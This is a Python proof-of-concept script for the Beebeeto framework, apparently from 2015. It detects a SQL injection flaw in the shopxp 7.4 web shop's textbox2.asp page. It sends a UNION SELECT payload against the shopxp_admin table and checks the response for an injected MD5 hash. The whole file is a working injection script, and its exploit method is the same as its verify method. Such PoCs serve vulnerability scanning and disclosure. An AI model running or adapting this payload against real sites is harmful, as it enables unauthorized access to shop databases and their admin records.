#!/usr/bin/env python
# encoding: utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        'poc':{
            'id':'poc-2015-0139',
            'name':'shopxp 7.4 /textbox2.asp SQL Injection PoC',
            'author':'cflq3',
            'create_date':'2015-09-18',
        },
        'protocol':{
            'name':'http',
            'port':[80],
            'layer4_protocol':['tcp'],
        },
        'vul':{
            'app_name':'shopxp',
            'vul_version':['7.4'],
            'type':'SQL Injection',
            'tag':['shopxp','sql注入漏洞','asp'],
            'desc':'shopxp 7.4 textbox2.asp sql injection',
            'references':['http://www.sebug.net/vuldb/ssvid-62319'],
        },
    }

    @classmethod
    def verify(cls, args):
        payload = '/TEXTBOX2.ASP?action=modify&news%69d=122%20and%201=2%20union%20select%201,2,MD5(1),4,5,6,7%20from%20shopxp_admin'
        verify_url = args['options']['target']+ payload
        if args['options']['verbose']:
            print '[*]Request URL: ' + verify_url
        req = urllib2.urlopen(verify_url)
        content = req.read()
        if req.getcode()==200:
            if 'c4ca4238a0b923820dcc509a6f75849b' in content:
                args['success']=True
                args['poc_ret']['vul_url'] = verify_url
        return args

    exploit=verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())